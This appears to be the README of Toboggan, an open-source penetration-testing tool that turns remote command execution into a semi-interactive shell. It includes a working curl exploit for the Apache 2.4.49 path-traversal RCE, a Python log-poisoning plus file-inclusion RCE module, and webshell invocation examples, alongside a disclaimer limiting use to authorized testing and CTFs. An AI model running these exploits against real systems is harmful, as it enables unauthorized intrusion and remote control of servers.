# Toboggan

🛝 Slide into post-exploitation from RCE with ease! Toboggan is your go-to tool that wraps your remote command execution into a semi-interactive shell, making the post-exploitation phase a breeze.

<p align="center">
    <img width="350" src="/media/toboggan-coin.jpg" alt="Material Bread logo">
</p>

Getting started with toboggan is as smooth. You can do this by pulling directly from the repository:
```shell
python3 -m pip install 'toboggan@git+https://github.com/n3rada/toboggan.git'
``` 

Or, by using [`pipx`](https://pypa.github.io/pipx/) - and you should -, give this a whirl:
```shell
pipx install 'git+https://github.com/n3rada/toboggan.git'
```

Thus, you can execute it with the following command:
```shell
toboggan -m /path/to/your/rce.py -i
```

This command loads your rce.py module and propels you into an interactive session for some remote fun. If you're in the mood for a subtler, semi-interactive experience, just drop the `-i` option.

## Built-in modules
### WebShell
Don't have a proper Python3 module on hand? Struck gold with a simple webshell.php? No worries! If your webshell just needs a cmd argument to spill the beans, do the following:
```shell
toboggan -u 'http://192.168.193.19/tmp/webshell.php?cmd'
```

Safety first. Always password-protect your shells. If you're the cautious type (and you should be), use Toboggan like this:
```shell
toboggan -u 'http://192.168.193.19/tmp/webshell.php?cmd' -p 'password'='@l/=$,dsfsdfm'
```

### System command
If it's a waste of time for you to build a python3 module because you don't like programming, and the vulnerability is easily exploitable with a command line, don't worry, you can use the `-o` or `--os` parameter and pass your command line with the `||cmd||` placeholder. For example, if you encounter a server running with `Apache httpd 2.4.49`, you can directly use:
```shell
toboggan -o 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
```

## `rce.py` module
An RCE (Remote Code Execution) Python3 module is essentially a Python3 source code crafted to manage your remote code execution. For a module to be compatible with Toboggan, it **must** include a method named **execute**. This method **should have two parameters**: command of type str and timeout of type float.

Here's an example of an RCE module that leverages Log Pollution combined with Local File Inclusion. Admittedly, it's a bit pesky to replay:
```python
# Buit-in imports
import re

# Third party library imports
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Remove the User-Agent header
    response = httpx.get(
        url="http://beachvolley/pong/index.php",
        params={
            "page": r"\..\..\..\..\..\..\..\..\..\..\\xampp\apache\logs\access.log",
            "cmd": command,
        },
        headers={
            "User-Agent": ""
        },
        # ||BURP||
        timeout=timeout,
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    if match := re.search(
        pattern=r'\|\|START_CMD\|\|(.+?)\|\|END_CMD\|\|',
        string=response.text,
        flags=re.IGNORECASE | re.DOTALL
    ):
        return match.group(1).strip()
```

Remember, this setup is module-dependent. For instance, if your module necessitates `proxychains`, you can effortlessly invoke `toboggan` as shown below:
```shell
proxychains -q toboggan /path/to/your/rce.py
```

### Interactivity methods used

#### Unix
The Unix environment offers a plethora of inter-process communication (IPC) mechanisms. One such fascinating tool is the mkfifo, colloquially known as a "named pipe". This one-way IPC is often a go-to when one wishes to emulate a remote interactive shell session over an inherently non-interactive medium - think HTTP requests or rudimentary command execution interfaces.

At its heart, a named pipe, or FIFO (First In, First Out), is an avenue to smoothly transition through an RCE in restrictive scenarios, such as those barricaded behind firewalls, making it feel almost like you're operating in a pseudo-TTY.

**Why the insistence on a separate polling thread**? Imagine sending a command with an indefinite waiting period (like the notorious `top` or the sluggish `sleep 10000`). Without a distinct thread to handle these, the main application would be ensnared in a deadlock, patiently awaiting the command's conclusion. Enter the read thread. Its primary role is to juggle the outputs of these prolonged commands, ensuring the main loop is unimpeded and ever-ready for fresh input or commands.

#### Windows
Not done yet

## Contributing

`toboggan` is an open-source project, and I welcome contributions. Feel free to submit issues, feature requests, or pull requests on the GitHub repository. In order to create a Pull Request, you can follow those steps:
- Fork the project
- Create your feature branch (`git checkout -b my-new-feature`)
- Commit your changes (`git commit -Sam 'Added some feature'`)
- Push to the branch (`git push origin my-new-feature`)
- Create new **Pull Request**

### Setup

Recommended way for developping inside this project is by using `poetry`. Once this repository cloned, you just have to type `poetry shell` to get your environment ready. 

### Test your implementation
If you want to create a `pipx` special installation, you can do the following command inside the root of the project:
```shell
pipx install . --suffix '-test'
```

### Building a proper `pip` package
If you want to try building the tool with a real package, you firstly run `poetry build` and then:
```shell
python3 -m pip install dist/toboggan*.whl --force-reinstall
```

---

_N.B._ If you really want to use old maneers, you can still create a `requirements.txt` file using the following `poetry` commands:
```shell
poetry export -f requirements.txt > requirements.txt
```

## Disclaimer
Toboggan is intended for use in legal penetration testing, Capture The Flag (CTF) competitions, or other authorized and ethical security assessments. Unauthorized use of this tool on systems you do not own or without proper authorization may be illegal. Please use "Toboggan" responsibly and in compliance with applicable laws and regulations.

## License
This project is licensed under the MIT License. See the LICENSE file for more details.
